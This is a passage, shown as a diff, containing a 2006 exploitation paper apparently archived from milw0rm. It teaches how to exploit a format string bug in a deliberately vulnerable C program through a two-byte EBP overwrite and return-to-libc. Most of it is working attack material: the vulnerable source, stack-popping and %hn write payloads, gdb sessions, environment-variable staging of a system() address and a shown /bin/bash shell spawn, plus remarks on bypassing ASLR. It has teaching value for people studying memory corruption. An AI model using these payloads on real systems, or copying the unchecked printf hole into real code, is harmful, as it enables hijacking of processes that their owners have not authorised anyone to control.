@@ -1,0 +1,481 @@
+                    Further advances in to exploiting vulnerable format string bugs
+                                by c0ntex | c0ntex[at]open-security.org
+                                         www.open-security.org
+                    ---------------------------------------------------------------
+
+
+Format string bugs are a method of abusing incorrect usage of the format functions like printf, sprintf,
+snprintf, fprintf, vfprintf and the likes. When these functions are called they require that a version
+specefier is used to display the data stored in one or more directives.
+
+In the last format paper I discussed how to use a user supplied string to allow for an abitrary write to
+any location in memory we wished. By modifying the GOT, DTORS or some other useful memory location, it is
+trivial to hijack the process completely and execute malicious, arbitrary code.
+
+However with the code below you will see that there are a couple of locations that make this impossible
+for us. This time we have a limited 2/3 byte, one time write, but we can still cause an overwrite to grant
+us control of the process and execute our very arbitrary code  :-)  In this paper we will combine several
+well known techniques together:
+
+       1) Format string abuse
+       2) Frame pointer overwrite
+       3) Return-to-libc
+
+This method, minus (3) was used in the POC exploit for RealPlayer, and as such is an applicable method in
+attacking wild applications. There are many ways to attack format string bugs but this paper will focus on
+modifying EBP pointer as was done in the Realplayer adviosory.
+
+It is worth noting that this method relies on the fact that the vulnerabe printf() syscall is not in the
+main() function, but perhaps 3 or more functions deep within the program. This is required due to the fact
+that the printf() syscall will pop addresses from it's current position, and suppose we are in the main()
+function already, there will only be the addresses of the main frame to play with and as such, a nice EBP
+takeover will not be possible.
+
+This is how it might look:
+
+
+	<------------------------ Stack growth ----------------------
+
+	-------------------------------------------------------------
+	| Frame 5 | Frame 4 | Frame 3 | Frame 2 | Frame 1 | Frame 0 |
+	-------------------------------------------------------------
+
+	...... printf(%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x) .....
+
+
+When there are no other frames to use, when the printf() function is in the main() body of the code, you
+need to rely on finding a pointer or some other useful location that is writable to gain control of the
+applications flow. There may be lots of locations that can be used to gain control of the binary, it just
+depends how lucky the attacker is and how hard she looks. Some areas that could be useful include:
+
+
+       Function pointers
+       Locations used in call instructions
+       Locations used in jmp instructions
+       Locations pointing to locations used in call or jmp instructions
+       Locations pointing to locations pointing to locations use in call or jmp instructions ;)
+       Addresses pointed to by registers, including ebp, esp and eip
+       etc,etc...
+
+
+Anyway, enough of the talk, let us start with the fun!
+
+
+/* fmt.c */
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#define SIZE1 150
+#define SIZE2 160
+
+int yummy(char *vuln, char *buf);
+int yumm(char *vuln);
+int yum(char *vuln);
+
+int yummy(char *vuln, char *buf)
+{
+       if((strlen(vuln) > SIZE1) || (strlen(vuln) < 0)) {
+               puts("\nString error! Try again!");
+               return(EXIT_FAILURE);
+       }
+       memcpy(buf, vuln, strlen(vuln));
+       yumm(vuln);
+       return(EXIT_SUCCESS);
+}
+
+int yumm(char *vuln)                    
+{
+       printf("You typed: ");
+       yum(vuln);
+       return(EXIT_SUCCESS);
+}
+
+int yum(char *vuln)                     
+{
+       printf(vuln); printf("\n");
+       return(EXIT_SUCCESS);
+}
+
+int main(int argc, char **argv)         
+{
+       char *buf = NULL;
+       char *vuln = NULL;
+
+       if(argc != 2)
+               return(EXIT_FAILURE);
+
+       buf = (char *)malloc(SIZE1);
+       if(!buf) {
+               perror("malloc");
+               return(EXIT_FAILURE);
+       }
+       vuln = (char *)malloc(SIZE2);
+       if(!vuln) {
+               perror("malloc");
+               return(EXIT_FAILURE);
+       }
+
+       vuln = argv[1];
+       yummy(vuln, buf);
+       free(buf); free(vuln);
+       return(EXIT_SUCCESS);
+}
+
+
+As you can see in the code, the printf function does not have a format specifier assigned. This is where
+the vulnerability lies, since we can now control how printf behaves. By passing a format specifier, we
+are able to display the contents of the stack as in a standard format string bug.
+
+
+c0ntex@debauch:~$ gcc -o fmt fmt.c -Wall
+c0ntex@debauch:~$ ./fmt hello
+You typed: hello
+c0ntex@debauch:~$ ./fmt AAAA.%p
+You typed: AAAA.0x40139ff4
+c0ntex@debauch:~$
+
+
+Lets try and find our supplied string by popping more addresses:
+
+
+(gdb) r AAAA`perl -e 'print ".%p" x 80'`
+Starting program: /home/c0ntex/fmt `perl -e 'print ".%p" x 80'`
+You typed: .0x40139ff4.0xbffffa18.0x8048568.0xbffffba5.0x40015cc0.0xbffffa38.0x804853f.0xbffffba5.
+0xbffffba5.0xf0.0x40139ff4(nil).0x40015cc0.0xbffffa58.0x8048634.0xbffffba5.0x8049928.0xbffffa68.
+0x804867a.0xbffffba5.0x8049928.0xbffffa88.0x4003a413.0x2.0xbffffab4.0xbffffac0.(nil).(nil).
+0x4000aaa0.0x4000b5a0.0x40015ff4.0x2.0x8048420.(nil).0x8048441.0x8048593.0x2.0xbffffab4.0x8048660.
+0x80486d0.0x4000b5a0.0xbffffaac.0x400167e4.0x2.0xbffffb94.0xbffffba5.(nil).0xbffffc96.0xbffffc9d.
+0xbffffca8.0xbffffcb8.0xbffffcc4.0xbffffce8.0xbfffff1d.0xbfffff40.0xbfffff4c.0xbfffff86.0xbfffff9c.
+0xbfffffa8.0xbfffffb9.0xbfffffc2.0xbfffffd4.0xbfffffdc.(nil).0x10.0x7e9fbbf.0x6.0x1000.0x11.0x64.
+0x3.0x8048034.0x4.0x20.0x5.0x7.0x7.0x40000000.0x8.(nil)
+
+Program exited normally.
+(gdb)
+
+
+From the output you should see that it has not been possible to reach our supplied string. As a result
+you can't just pop the way to the supplied location and do a write anything anywhere. This is a tedious
+restriction, but it does not stop us since we have a supply of other addresses we could potentially use.
+
+What we need to look for are locations that we can write to, which will end in being able to gain control
+of the applications execution. Using /proc/pid/maps we can find all writable locations of the running
+process, then we just compare those addresses with what we popped via the format bug we abuse:
+
+
+(gdb) shell cat /proc/14753/maps
+08048000-08049000 r-xp 00000000 08:06 32664      /home/c0ntex/fmt
+08049000-0804a000 rw-p 00000000 08:06 32664      /home/c0ntex/fmt
+  ^^^^^^^^^^^^--- look good
+0804a000-0806b000 rwxp 00000000 00:00 0
+  ^^^^^^^^^^^^--- look good
+40000000-40015000 r-xp 00000000 08:01 196671     /lib/ld-2.3.5.so
+40015000-40017000 rw-p 00014000 08:01 196671     /lib/ld-2.3.5.so
+  ^^^^^^^^^^^^--- look good
+40017000-40019000 rw-p 00000000 00:00 0
+  ^^^^^^^^^^^^--- look good
+40025000-40138000 r-xp 00000000 08:01 196717     /lib/libc-2.3.5.so
+40138000-40139000 r--p 00112000 08:01 196717     /lib/libc-2.3.5.so
+40139000-4013c000 rw-p 00113000 08:01 196717     /lib/libc-2.3.5.so
+  ^^^^^^^^^^^^--- look good
+4013c000-4013f000 rw-p 00000000 00:00 0
+  ^^^^^^^^^^^^--- look good
+bfffd000-c0000000 rwxp ffffe000 00:00 0
+  ^^^^^^^^^^^^--- look good
+(gdb)
+
+
+Looking back at the stack pops, we can compare addresses reachable from command line with areas in the
+process address space that are write or executable, preferably both:
+
+
+0x40139ff4.0xbffffa18.0x8048568.0xbffffba5.0x40015cc0.0xbffffa38.0x804853f.0xbffffba5.
+0xbffffba5.0xf0.0x40139ff4(nil).0x40015cc0.0xbffffa58.0x8048634.0xbffffba5.0x8049928.0xbffffa68.
+0x804867a.0xbffffba5.0x8049928.0xbffffa88.0x4003a413.0x2.0xbffffab4.0xbffffac0.(nil).(nil).
+0x4000aaa0.0x4000b5a0.0x40015ff4.0x2.0x8048420.(nil).0x8048441.0x8048593.0x2.0xbffffab4.0x8048660.
+0x80486d0.0x4000b5a0.0xbffffaac.0x400167e4.0x2.0xbffffb94.0xbffffba5.(nil).0xbffffc96.0xbffffc9d.
+0xbffffca8.0xbffffcb8.0xbffffcc4.0xbffffce8.0xbfffff1d.0xbfffff40.0xbfffff4c.0xbfffff86.0xbfffff9c.
+0xbfffffa8.0xbfffffb9.0xbfffffc2.0xbfffffd4.0xbfffffdc.(nil).0x10.0x7e9fbbf.0x6.0x1000.0x11.0x64.
+0x3.0x8048034.0x4.0x20.0x5.0x7.0x7.0x40000000.0x8.(nil)
+
+
+With this information we can start to work through the addresses, verifying what each is responsible for
+and narrowing down the location we can write to. 
+
+Out of the addresses above, here is a map all the RWX addresses that are viable targets:
+
+
+0xbffffa18.0xbffffba5.0xbffffa38.0xbffffba5.0xbffffba5.0xbffffa58.0xbffffba5.0xbffffa68
+0xbffffba5.0xbffffa88.0xbffffab4.0xbffffac0.0xbffffab4.0xbffffaac.0xbffffb94.0xbffffba5
+0xbffffc96.0xbffffc9d.0xbffffca8.0xbffffcb8.0xbffffcc4.0xbffffce8.0xbfffff1d.0xbfffff40
+0xbfffff4c.0xbfffff86.0xbfffff9c.0xbfffffa8.0xbfffffb9.0xbfffffc2.0xbfffffd4.0xbfffffdc
+
+
+We know we can write and execute things here which makes the job very simplistic, time to find out what
+these addresses do in relation to the program we are attacking:
+
+
+(gdb) r `perl -e 'print ".%p" x 80'`%n
+Starting program: /home/c0ntex/fmt `perl -e 'print ".%p" x 80'`%n
+
+Program received signal SIGSEGV, Segmentation fault.
+0x40062971 in vfprintf () from /lib/libc.so.6
+(gdb) bt
+#0  0x40062971 in vfprintf () from /lib/libc.so.6
+#1  0x4006830a in printf () from /lib/libc.so.6
+#2  0x08048580 in yum ()
+#3  0x08048568 in yumm ()
+#4  0x0804853f in yummy ()
+#5  0x08048634 in main ()
+(gdb) i r
+eax            0x9      9
+ecx            0xbffffb48       -1073743032
+edx            0xbffff8dc       -1073743652
+ebx            0x40139ff4       1075027956
+esp            0xbfffd398       0xbfffd398
+ebp            0xbffff9dc       0xbffff9dc
+esi            0xbffffb44       -1073743036
+edi            0x2d1    721
+eip            0x40062971       0x40062971
+eflags         0x286    646
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x0      0
+(gdb) frame 1
+#1  0x4006830a in printf () from /lib/libc.so.6
+(gdb) i r
+eax            0x9      9
+ecx            0xbffffb48       -1073743032
+edx            0xbffff8dc       -1073743652
+ebx            0x40139ff4       1075027956
+esp            0xbffff9e4       0xbffff9e4
+ebp            0xbffff9f8       0xbffff9f8
+esi            0x0      0
+edi            0x40015cc0       1073831104
+eip            0x4006830a       0x4006830a
+eflags         0x286    646
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x0      0
+(gdb) frame 2
+#2  0x08048580 in yum ()
+(gdb) i r
+eax            0x9      9
+ecx            0xbffffa04       -1073743356
+edx            0xbffff8dc       -1073743652
+ebx            0x40139ff4       1075027956
+esp            0xbffffa00       0xbffffa00
+ebp            0xbffffa08       0xbffffa08
+esi            0x0      0
+edi            0x40015cc0       1073831104
+eip            0x8048580        0x8048580
+eflags         0x286    646
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x0      0
+(gdb) frame 3
+#3  0x08048568 in yumm ()
+(gdb) i r
+eax            0x9      9
+ecx            0xbffffa04       -1073743356
+edx            0xbffff8dc       -1073743652
+ebx            0x40139ff4       1075027956
+esp            0xbffffa10       0xbffffa10
+ebp            0xbffffa18       0xbffffa18
+esi            0x0      0
+edi            0x40015cc0       1073831104
+eip            0x8048568        0x8048568
+eflags         0x286    646
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x0      0
+(gdb) frame 4
+#4  0x0804853f in yummy ()
+(gdb) i r
+eax            0x9      9
+ecx            0xbffffa04       -1073743356
+edx            0xbffff8dc       -1073743652
+ebx            0x40139ff4       1075027956
+esp            0xbffffa20       0xbffffa20
+ebp            0xbffffa38       0xbffffa38
+esi            0x0      0
+edi            0x40015cc0       1073831104
+eip            0x804853f        0x804853f
+eflags         0x286    646
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x0      0
+(gdb) frame 5
+#5  0x08048634 in main ()
+(gdb) i r
+eax            0x9      9
+ecx            0xbffffa04       -1073743356
+edx            0xbffff8dc       -1073743652
+ebx            0x40139ff4       1075027956
+esp            0xbffffa40       0xbffffa40
+ebp            0xbffffa58       0xbffffa58
+esi            0x0      0
+edi            0x40015cc0       1073831104
+eip            0x8048634        0x8048634
+eflags         0x286    646
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x0      0
+(gdb)
+
+
+The astute reader will see that right away there is something interesting :-) If you have a look at the
+EBP registers in each of the frames, you will notice that some of these addresses are reachable with our
+pops. This means that we can directly manipulate the EBP register with a 2 byte write. Let us try it and
+see what happens.
+
+
+(gdb) r %.16705u%2\$hn
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/c0ntex/fmt %.16705u%2\$hn
+You typed: 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+... SNIPPED ...
+00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001075027956
+Program received signal SIGSEGV, Segmentation fault.
+0x0804853f in yummy ()
+(gdb) bt
+#0  0x0804853f in yummy ()
+#1  0x00000000 in ?? ()
+(gdb) x/x $ebp
+0xbfff4141:     0x00000000
+(gdb) frame 1
+#1  0x00000000 in ?? ()
+(gdb) x/x $esp
+0xbfff4149:     0x00000000
+(gdb)
+
+
+It seems we were right, we have written 0x4141 (16705) to the EBP MSB. Once "mov %ebp, %esp" happens, ESP
+becomes under our control. Now all we need to do is have our shellcode location address waiting at the
+address in ESP, and we should have a shell.
+
+What is needed might look something like so:
+
+
+	[ EBP ] ----> [ ESP ] ---> [ EIP ] ---> [shellcode] ---> c0ntex@debauch:~$
+
+
+So let us try. By exporting some known string into an environment variable, we can see if it is reachable
+when we do a modification of EBP:
+
+
+c0ntex@debauch:~$ export PAD=AAAABBBBCCCCDDDDEEEEFFFF
+c0ntex@debauch:~$ /home/c0ntex/code/memenv PAD
+
+[-] Environment variable [$PAD] is at [0xbfffff9c]
+[-] Environment variable is set to [AAAABBBBCCCCDDDDEEEEFFFF]
+
+c0ntex@debauch:~$ gdb ./fmt
+GNU gdb 6.3-debian
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-linux"...Using host libthread_db
+library "/lib/libthread_db.so.1".
+
+(gdb) b main
+Breakpoint 1 at 0x8048599
+(gdb) r
+Starting program: /home/c0ntex/fmt
+
+Breakpoint 1, 0x08048599 in main ()
+(gdb) x/s 0xbfffff9c
+0xbfffff9c:      "PAD=AAAABBBBCCCCDDDDEEEEFFFF"
+(gdb)
+
+(gdb) r %.65436u%2\$hn
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/c0ntex/fmt %.36u%2\$hn
+You typed: 000000000000000000000000000000... SNIPPED
+...000000000000000000000000000000000001075027956
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb)
+
+
+Interesting :-) We seem to be able to control the next instruction to execute. Ok so we will now replace
+the address being pointed to by EIP with one that contains some opcode and see if we can spawn us a nice
+shell..
+
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0x4005a020 <system>
+(gdb) x/s 0xbffffc0f
+0xbffffc0f:      "SHELL=/bin/bash"
+(gdb) x/s 0xbffffc9d
+0xbffffc15:      "/bin/bash"
+(gdb) q
+The program is running.  Exit anyway? (y or n) y
+c0ntex@debauch:~$ export PAD=`printf
+"\x20\xa0\x05\x40\x90\x90\x90\x90\x15\xfc\xff\xbf"`
+c0ntex@debauch:~$ ./fmt %.65379u%2\$hn
+00000000000000000000000... SNIPPED
+...00000000000000000000000000000000000000000000001075027956
+c0ntex@debauch:~$ ps -ef | tail -4
+c0ntex    1185  1153  0 12:05 pts/0    00:00:00 ./fmt %.65379u%2$hn
+c0ntex    1186  1185  0 12:05 pts/0    00:00:00 /bin/bash
+c0ntex    1191  1186  0 12:06 pts/0    00:00:00 ps -ef
+c0ntex    1192  1186  0 12:06 pts/0    00:00:00 /bin/bash
+c0ntex@debauch:~$
+
+
+Perfect, it worked nicely for us! By using some addresses we can reach via pops, it is easily possible to
+gain control of the process execution.
+
+Say instead of EBP, we can write to a pointer and it's location is at 0x08049123. We could use our string
+to modify the 0x9123 section of the address and point it to an arbitrary location. Let us also suppose that
+some user input is stored at location 0x08057777, again the attacker can gain control of the process by
+changing 0x08057777 to 0x08049123 with one write, and we win.
+
+Another situation is when we can store our shellcode location in %eax for instance, all one needs to do is
+search for a writeable / reachable place in memory where we can modify an address to a call *%eax, and we
+win again. 
+
+It should also be possible to bypass stack randomisation (ASLR) using tricks like this, as every time the
+code runs, the useful EBP / blah addresses will be at the same pop distance on the stack, i.e 2 pops. The
+only nasty thing would be brute forcing the shellcode location in either an environment variable or argv.
+
+Though, it may be possible to perform the above pointer trick and bypass the need to brute force, that will
+rely on there being no mmap() randomisation however.
+
+This just goes to show that in cases when an attacker can not reach their supplied input directly during
+the attack, it is still possible to gain control of the application, and, there are lots of variations that
+can be used.
+
+Even in worst case scenarios when an attacker can not reach supplied input AND can only perform one 2 byte,
+or maybe 3 byte write, it is still not too difficult to gain control of the application.
+
+As such, any format string bug is almost always exploitable, you just have to look hard enough. I hope this
+short paper has been useful. 
+
+
+EOF
+
+# milw0rm.com [2006-04-08]
